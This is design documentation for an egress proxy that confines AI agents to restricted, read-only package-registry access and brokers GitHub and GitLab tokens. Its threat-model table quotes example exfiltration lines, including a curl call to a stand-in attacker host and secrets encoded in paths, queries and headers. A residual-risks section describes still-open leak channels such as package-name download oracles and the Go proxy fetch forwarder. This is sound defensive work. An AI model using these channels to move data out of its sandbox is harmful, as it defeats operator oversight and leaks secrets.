# Service presets

A service preset is one `services:` entry in config.yaml that grants a named
service exactly the egress it needs. Two kinds ship:

- **Registry presets** (`go`, `npm`, `docker`, `ghcr`, `pypi`, `crates`) —
  read-only access to package registries as *restricted hosts*, enforced by
  the rule engine in `registries.py`.
- **Credential presets** (`github`, `gitlab`) — the service's host is
  allowlisted and its API token is *brokered*: the CLI in the sandbox holds a
  fake token, the proxy swaps in the real one.

```yaml
# config.yaml
services:
  - go
  - npm
  - service: github
    fake_value: "ghp_0000000000000000000000000000000000fake"
    real_value: "${GITHUB_TOKEN}"    # ${KEY} resolved from secrets_file
  - service: gitlab
    host: gitlab.example.com         # self-hosted: the entry supplies the host
    fake_value: "glpat-00000000000000fake"
    real_value: "${GITLAB_TOKEN}"
```

Presets are descriptors (`services.py`), expanded at config load into the
proxy's existing primitives — the host allowlist, restricted-host rule sets,
and credential broker entries. The two enforcement engines stay separate.

# Registry presets: restricted read-only access to package registries

Agents constantly need to download packages (Go modules, npm packages, container
images). Fully allowlisting a registry host would open exfiltration channels:
POST bodies, free-form URLs and query strings, arbitrary headers. Registry
presets add a third access tier between "fully allowed" and "denied" —
**restricted hosts** — with curated per-registry rules that permit the read-only
download traffic these ecosystems need while structurally closing the channels
that could carry sandbox data out.

## Threat model

The agent is assumed potentially compromised (e.g. by prompt injection). The
question for every field of a "read-only" request is: *can it carry arbitrary
sandbox data to an attacker-readable sink?*

### Channels closed hard

These are structural channels that could carry arbitrary bytes to arbitrary
receivers. They are closed outright:

| Channel | Example attack | Mitigation |
|---|---|---|
| Hostname | `curl https://exfil.attacker.com/…` | Presets pin exact hostnames; anything else stays in the normal allow/deny flow. |
| Path | `GET /v2/x/blobs/<base64(secret)>` | Anchored `fullmatch` patterns with bounded segment lengths and tight character classes; max URL length 4096; `..` and `%2e` rejected; literal `%` only where a rule opts in. |
| Query string | `?q=<secret>` | Per-rule query-param allowlist with per-value patterns; the default is *no query string at all*. This closes e.g. npm search (`/-/v1/search?text=…`). |
| Request headers | `X-Data: <secret>`, `Cookie:` leaking sandbox cookies | Header allowlist (base set + per-preset extras); unknown headers are dropped and their *names* logged; values are length-capped. |
| Request body | npm audit POST carries the full dependency tree | Only GET/HEAD are allowed, and a non-empty body on GET/HEAD is a violation. |
| Method | POST/PUT/DELETE side effects (package upload!) | Per-rule method sets; all presets are GET/HEAD only. |

Design choice: patterns are **grammar-based, not entropy-based**. Instead of
trying to detect "too much entropy" in a request, each path segment is
constrained to a character class with an explicit length bound. What remains
expressible (package names, versions, digests) is a channel whose only
receivers are the registry operators themselves — see below.

A useful observation about headers: once hostname, path, and query are pinned,
header values can only reach the registry operator (Google, npm Inc., Docker
Inc., GitHub, PSF, the crates.io team), whose request logs are not
attacker-readable. Header scrubbing therefore mainly prevents *accidental*
credential leakage (cookies, tokens) and protocol tricks (`Upgrade:` is not
allowlisted, so no WebSocket), rather than closing an attacker-readable
channel. That is why values are bounded, not normalized.

### Residual risks — accepted and logged

These are low-bandwidth semantic sinks that cannot be closed without breaking
the feature. Every allowed request is logged with its full path, so all of them
are auditable after the fact.

1. **Package-name existence oracles.** An attacker can publish a package named
   after data they want to receive (`npm install exfil-a3f9…`) and observe the
   download through public download-count APIs (npm replicate feed, pypistats,
   crates.io download counts, Docker Hub pull counts). Bandwidth: up to ~214
   constrained characters per request, observable with hours-to-days latency at
   coarse granularity. Closing this requires a package-level allowlist (e.g.
   derived from lockfiles) — listed under future hardening.
2. **Go module proxy as a fetch forwarder.** Requesting an attacker-hosted
   module makes proxy.golang.org fetch from the attacker's VCS on a cache miss;
   the attacker's server logs then reveal the requested version string (~100
   semver-charset characters per request).
3. **High-entropy digest fields.** An OCI blob request carries
   `sha256:<64 hex>` — 32 arbitrary bytes. But an unknown digest simply 404s at
   the registry, and pull-count oracles are repository-level, not digest-level,
   so those bytes reach only the registry operator. Digests are constrained to
   exactly `sha256:` + 64 hex characters. The same reasoning applies to signed
   CDN query parameters (Cloudflare/Azure blob URLs), which are registry-issued
   and bounded.
4. **Timing and request-count channels.** Inherent to allowing any network
   access at all.

Out of scope entirely (unchanged trust model): prompt injection via *response*
content, and compromise of a registry itself.

## How enforcement works

Request evaluation order in the proxy:

1. Host in `allowed_hosts` → unrestricted pass (the operator's explicit broader
   grant, and the escape hatch when a preset pattern is too tight). A host that
   appears in both `allowed_hosts` and a restricted rule set triggers a
   `config_warning` log event at load time.
2. Host has an active temporary allow (TUI/management API) → unrestricted pass.
   Temp-allowing a restricted host deliberately lifts all its restrictions —
   the operator action you want when a pattern blocks a legitimate workflow.
3. Host has restricted rules → evaluate. On match, non-allowlisted request
   headers are scrubbed (names logged, never values) and the request proceeds.
   On mismatch → **403** with a body explaining the violation. Unlike the
   503-pending-approval response, a 403 will not resolve by retrying.
4. Otherwise → 503, pending human approval (existing flow).

Violations appear in the deny log and TUI tagged `type: policy_violation` with
a `reason` — an agent POSTing to npm is exactly what an operator should see.
Allowed registry requests are logged with a `registry: <preset>` field.

Response side: restricted hosts strip all `Set-Cookie` headers by default
(registries don't need cookies; they are a session/tracking channel into the
sandbox). Custom `restricted_hosts` entries can override this with
`allow_response_cookies`.

### Base request-header allowlist

`host`, `accept`, `accept-encoding`, `user-agent`, `connection`,
`content-length`, `range`, `if-none-match`, `if-modified-since`, `te` — with
per-value length caps (256 bytes default; larger for `accept`, `user-agent`,
and `authorization` where declared). Presets that need OCI token auth
(`docker`, `ghcr`) additionally allow `authorization`: those Bearer tokens are
issued by the registry itself seconds earlier over the same constrained
channel, and the token endpoints pin the requested scope to `:pull`, so even a
leaked push credential cannot be exercised through the proxy.

## Presets

| Preset | Hosts | Allows |
|---|---|---|
| `go` | `proxy.golang.org`, `sum.golang.org` | Module list/info/mod/zip, `@latest`, and the checksum DB — including the `/sumdb/…` paths the toolchain fetches *through* the module proxy. |
| `npm` | `registry.npmjs.org` | Packuments (incl. scoped `@scope/name` and the `%2f`-encoded form) and `/-/…tgz` tarballs. |
| `docker` | `registry-1.docker.io`, `auth.docker.io`, `production.cloudflare.docker.com`, `production.cloudfront.docker.com` | `/v2/` ping, manifests, blobs, pull-scoped tokens, and the CDN hosts blob GETs redirect to (Cloudflare or CloudFront, varies over time/region). |
| `ghcr` | `ghcr.io`, `pkg-containers.githubusercontent.com` | Pull-scoped tokens, manifests, blobs, and the blob CDN redirect target. |
| `pypi` | `pypi.org`, `files.pythonhosted.org` | Simple index (PEP 503), JSON API, and package files. |
| `crates` | `index.crates.io`, `crates.io`, `static.crates.io` | Sparse index, the API download endpoint, and `.crate` files. |

Rule definitions live in `registries.py` (`PRESETS`); its git history is the
audit trail for policy changes.

### Known client-side friction

- **npm audit and search are blocked by design.** The audit POST body encodes
  the entire dependency tree — a high-bandwidth channel via invented package
  names. npm treats audit failure as non-fatal, but to silence the warning run
  `npm install --no-audit` or set `audit=false` in `.npmrc`.
- **Swap-mode credentials** on a restricted host require the credential header
  to be listed in that host's `request_headers`; otherwise scrubbing removes it
  before the credential broker sees it. Inject-mode credentials are unaffected
  (injection happens after scrubbing).
- If a preset pattern turns out too tight for a legitimate workflow, the
  violation shows up in the TUI; temp-allowing the host is the immediate
  escape hatch, and a custom `restricted_hosts` entry (which replaces the
  preset's rules for that host) is the durable fix.

## Custom restricted hosts

The same engine is available for your own hosts:

```yaml
restricted_hosts:
  - host: artifacts.internal.example.com
    rules:
      - methods: [GET, HEAD]
        path: "/repo/[a-z0-9-]{1,64}/[a-zA-Z0-9._-]{1,128}"
        query:                       # omit `query` entirely to forbid query strings
          version: "[a-z0-9.]{1,32}"
    request_headers: [authorization] # extras beyond the base allowlist
```

Guardrails apply to user rules exactly as to presets: patterns are anchored
(`fullmatch`), unbounded quantifiers (`*`, `+`, `{n,}`) are rejected at load
time, and a literal `%` in a path pattern requires `allow_percent: true` on the
rule. A rule's `query` may use the special key `"*"` to allow any parameter
name (≤40 chars, `[A-Za-z0-9_.-]`) against one value pattern — intended for
CDN-signed URLs.

# Credential presets: brokered API tokens

The credential broker (`CredentialBrokerAddon`) already ensured real secrets
never enter the sandbox: the agent's CLI is configured with a fake token, and
the proxy replaces it with the real one on the way out (swap mode). A request
carrying any other non-empty value in the credential header is blocked with a
403 and logged — an agent that was prompt-injected into using a stolen or
invented token gets caught, not forwarded.

Credential presets add the per-service knowledge, so one entry wires
everything:

| Preset | Host | Header the CLI sends | Fake-token shape |
|---|---|---|---|
| `github` | `api.github.com` (fixed) | `Authorization: token <t>` | `ghp_` + 36 chars |
| `gitlab` | from the entry's `host:` (self-hosted) | `PRIVATE-TOKEN: <t>` | `glpat-` + 20 chars |

The entry's `fake_value`/`real_value` are the bare tokens; the preset wraps
them in the header format its CLI actually sends (`token …` for `gh`, no
prefix for `glab`). The fake-token shape matters because CLIs validate token
format locally before sending anything.

The credential's host is allowlisted by default — that's what makes "add
GitHub" a single step. Set `allow_host: false` to broker the token without
granting the host (e.g. when the host is already covered by a restricted rule
set). If a preset ever attaches a credential to a *restricted* host, the
expansion automatically adds the credential header to that host's
`request_headers`, so header scrubbing can't strip it before the broker runs.

## Real tokens never leave the proxy side

- Keep real values in `secrets_file` (outside the repo and the sandbox) and
  reference them as `${GITHUB_TOKEN}`; config.yaml then contains no secret.
- The management API never returns credential values — endpoints serialize
  hostnames and rule sources only, and config rewrites round-trip the raw
  `${KEY}` reference, never the expanded secret. A regression test
  (`test_real_credential_never_appears_in_any_response`) pins this.
- Logs record that a swap happened (`credential_injected`: host, header,
  mode) — never the real value. A mismatch logs the *expected fake* only.

## Future hardening (not implemented)

- **Lockfile-derived package allowlists** — closes the existence-oracle channel
  by only permitting known dependency names.
- **Digest provenance tracking** — only allow blob digests previously seen in
  an allowed manifest response; the proxy sees manifest bodies, so this is
  feasible and would fully close the digest channel.
- **404-rate alarms / rate limiting** — flag probing and timing channels.
- **Proxy-side OCI token brokering** — the proxy performs the token dance so
  the agent never holds registry tokens.
- **`module_prefixes` for the Go preset** — pin the module universe for teams
  with a known dependency set, closing the fetch-forwarder channel.
- **npm audit opt-in** (`allow_audit`) for setups that accept the dependency
  tree disclosure.
